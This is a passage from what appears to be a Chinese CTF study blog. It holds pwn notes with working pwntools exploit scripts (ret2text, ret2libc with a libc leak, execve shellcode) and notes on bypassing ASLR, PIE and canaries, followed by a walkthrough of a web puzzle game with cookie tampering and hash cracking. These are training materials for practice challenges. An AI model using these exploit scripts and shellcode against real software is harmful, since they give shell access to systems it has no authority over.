class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b foo&#x27;</span>)<span class="comment">#在foo函数下断</span></span><br><span class="line">    <span class="comment"># 如果直到backdoor和binsh的地址可直接写地址</span></span><br><span class="line">    <span class="comment"># backdoor = 0x08049172</span></span><br><span class="line">    <span class="comment"># bin_sh = 0x0804A008</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    main_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p32(backdoor) + p32(main_addr) + p32(bin_sh)<span class="comment"># 即执行完backdoor函数后返回到main函数</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="6-Shellcode"><a href="#6-Shellcode" class="headerlink" title="6. Shellcode"></a>6. Shellcode</h1><p>shellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。</p><ul><li>system(“/bin/sh”);（？） -&gt; execve(“/bin/sh”, 0, 0)</li><li>触发中断(int 0x80 / syscall)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; first.asm</span><br><span class="line">; first get shell test in pwn class</span><br><span class="line">; nasm -f elf32 first.asm</span><br><span class="line">; ld -m elf_i386 -o getShell first.o</span><br><span class="line">; objump -d getShell</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">push &quot;/sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>Shellcode脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    My_Shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload2 = asm(My_Shellcode)</span><br><span class="line">    p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25266)</span></span><br><span class="line">    <span class="comment"># p.sendline(payload1)</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="7-ROP链构造"><a href="#7-ROP链构造" class="headerlink" title="7. ROP链构造"></a>7. ROP链构造</h1><p>NX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。</p><p>ROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。</p><p>核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。</p><p>gadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。</p><h2 id="7-1-Ret2Text"><a href="#7-1-Ret2Text" class="headerlink" title="7.1 Ret2Text"></a>7.1 Ret2Text</h2><p>gadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。</p><p>辅助工具：ropper、pwntools(ELF class)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># backdoor = e.plt[&#x27;system&#x27;]</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    poprdi = <span class="number">0x4011eb</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(poprdi) + p64(bin_sh) + p64(backdoor)<span class="comment"># 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><p>如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。</p><h2 id="7-2-Ret2syscall"><a href="#7-2-Ret2syscall" class="headerlink" title="7.2 Ret2syscall"></a>7.2 Ret2syscall</h2><ul><li>一般为静态链接的可执行文件，指令非常多，也提供了许多gadget</li></ul><ul><li>最核心gadget：syscall(int 0x80)</li></ul><ul><li>整体类似Shellcode注入</li></ul><img src="/posts/1c971db4/7.2.1.png" class="" title="静动态链接"><p>静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。</p><p>利用ROPgadget工具，自行生成ROP链。</p><h2 id="7-3-PLT表和GOT表"><a href="#7-3-PLT表和GOT表" class="headerlink" title="7.3 PLT表和GOT表"></a>7.3 PLT表和GOT表</h2><p><a href="https://blog.csdn.net/qq_52126646/article/details/119494939">GOT表和PLT表</a></p><p>这里的PLT表示<code>.plt</code>，GOT表表示<code>.got.plt</code>。<code>.got</code>存放其它全局符号信息，与<code>.got.plt</code>不同，与<code>.plt</code>关系不大。</p><h2 id="7-4-Ret2libc"><a href="#7-4-Ret2libc" class="headerlink" title="7.4 Ret2libc"></a>7.4 Ret2libc</h2><ul><li>对动态链接文件，一般链接glibc</li></ul><ul><li>glibc链接基址未知，需要进行基址泄露</li></ul><ul><li>一般需要程序循环，可以通过ROP链构造循环</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400c83</span></span><br><span class="line">penc = <span class="number">0x4009a0</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b *0x4009d1\nb *0x400aee&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;choice&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(prdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(penc)<span class="comment"># 泄露puts函数地址</span></span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\x40\x0a&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;start detecting libc address&#x27;</span>)</span><br><span class="line">    libc_puts = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;libc puts address found:&#x27;</span> + <span class="built_in">hex</span>(libc_puts))</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">    <span class="comment"># libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># libc.select_libc(0)</span></span><br><span class="line">    libc_addr = libc_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rtn_addr = <span class="number">0x400b27</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        payload += p64(rtn_addr)<span class="comment"># for align</span></span><br><span class="line">    payload += p64(prdi) + p64(libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)) + p64(libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="8-ELF保护措施及绕过方法"><a href="#8-ELF保护措施及绕过方法" class="headerlink" title="8. ELF保护措施及绕过方法"></a>8. ELF保护措施及绕过方法</h1><h2 id="8-1-ASLR"><a href="#8-1-ASLR" class="headerlink" title="8.1 ASLR"></a>8.1 ASLR</h2><p>ASLR(Address space layout randomization)——地址空间配置随机化</p><p>将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。</p><p>应对方法：地址泄露</p><h2 id="8-2-NX"><a href="#8-2-NX" class="headerlink" title="8.2 NX"></a>8.2 NX</h2><p>看[7.ROP链构造]</p><h2 id="8-3-PIE"><a href="#8-3-PIE" class="headerlink" title="8.3 PIE"></a>8.3 PIE</h2><p>PIE(Position-independent executable)——地址无关代码/可执行文件</p><p>无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。</p><p>整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。</p><p>应对方法：Partial Writing</p><p>程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。</p><p>一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向</p><h2 id="8-4-Canary"><a href="#8-4-Canary" class="headerlink" title="8.4 Canary"></a>8.4 Canary</h2><p>Canary(Canary in a coal mine)——金丝雀</p><p>一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。</p><p>应对方法：Canary Leak</p><ul><li>覆盖栈到Canary处，利用puts等函数泄露地址</li><li>Canary最低字节为0，防止连带输出</li></ul><p>小技巧：<code>scanf(&quot;%d&quot;);</code>输入”+”不覆盖内存数据</p><h1 id="9-Stack-Pivot"><a href="#9-Stack-Pivot" class="headerlink" title="9. Stack Pivot"></a>9. Stack Pivot</h1><p>假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先存个档。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞渗透" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>黑客丛林之旅小游戏</title>
    <link href="http://example.com/posts/9589547b.html"/>
    <id>http://example.com/posts/9589547b.html</id>
    <published>2022-04-05T01:29:28.302Z</published>
    <updated>2022-04-11T05:25:37.153Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.fj543.com/hack/">黑客丛林之旅</a></p><p>1-<a href="http://www.fj543.com/hack/?level=1">http://www.fj543.com/hack/?level=1</a></p><blockquote><p>提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) </p></blockquote><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">gogogo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;go8990&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;OK,过关了！&quot;</span>);<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;./?level=222&quot;</span>;&#125; <span class="keyword">else</span> &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码错误！&quot;</span>);<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="title function_">focus</span>();&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2-<a href="http://www.fj543.com/hack/?level=222">http://www.fj543.com/hack/?level=222</a></p><blockquote><p>提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">chkPassword</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能为空！(Input password please)&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能填东西！(Don&#x27;t input password please)&quot;</span>);&#125; <span class="comment">//无论输入什么内容,就是不让你提交！</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;./&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return chkPassword()&quot;</span>&gt;</span></span><br><span class="line">输入密码进入下一关 (Input password please)<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;act&quot;</span> <span class="attr">id</span>=<span class="string">&quot;act&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pass2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script标签里的东西改不了，将表单的<code>return chkPassword()</code>删掉即可。</p><p>3-<a href="http://www.fj543.com/hack/?level=3login">http://www.fj543.com/hack/?level=3login</a></p><blockquote><p>您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) </p><p>提示语：这该死的网页，凭什么说我没有登录？(Damn page! Why you say that I didn’t login?)  </p></blockquote><p>在cookie管理器或抓包改cookie，no改成yes即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no</span><br></pre></td></tr></table></figure><p>4-<a href="http://www.fj543.com/hack/?level=4ditdah">http://www.fj543.com/hack/?level=4ditdah</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. .</span><br><span class="line">. _</span><br><span class="line">_ _</span><br><span class="line">_ _ _</span><br><span class="line">_ . _</span><br><span class="line">提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  </span><br></pre></td></tr></table></figure><p> 摩斯电码<code>IAMOK</code></p><p>5-<a href="http://www.fj543.com/hack/?level=5crack">http://www.fj543.com/hack/?level=5crack</a></p><blockquote><p>提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  </p></blockquote><p><code>YmFzZTY0aXNvaw==</code>有大小写和等号，考虑base64<code>base64isok</code></p><p><code>ad93c1d102ae60f4</code>是MD5<code>520530</code>，但用<code>520530</code>过不了关？？？</p><p>6-<a href="http://www.fj543.com/hack/?level=6por">http://www.fj543.com/hack/?level=6por</a></p><blockquote><p> if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle<br> password= ？</p><p> 提示语：有些常见的数字要记住。(You should remember some numbers)  </p></blockquote><p>常见端口号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc:3389</span><br><span class="line">vnc:5901</span><br><span class="line">MSSQL:1433</span><br><span class="line">MySQL:3306</span><br><span class="line">Oeacle:1521</span><br></pre></td></tr></table></figure><p>password=1433+3306+1521=6260</p><p>7-<a href="http://www.fj543.com/hack/?level=75901">http://www.fj543.com/hack/?level=75901</a></p><blockquote><p>提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  </p></blockquote><p>一张GIF动图，拿去<code>Stegsolve</code>把它拆了analyse-&gt;frame browser，拆成6张图，组合起来为<code>8bIGNOREwmUPPERCASEqneWORDS</code>，大写字母的意思是<code>ignore upper words</code>忽略大写字母，所以正确答案为<code>8bwmqne</code>。</p><p>8-<a href="http://www.fj543.com/hack/?level=8bwmqne">http://www.fj543.com/hack/?level=8bwmqne</a></p><blockquote><p>吴世昌的弟弟的网名是什么？(What’s the username of WuShichang’s little brother) </p><p>提示语：小小社工，过这一关主要靠人脑，电脑只是辅助。(Social Engineering.Use your brain more,and use computer less) </p></blockquote><p>吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为<code>fj573</code></p><p>9-<a 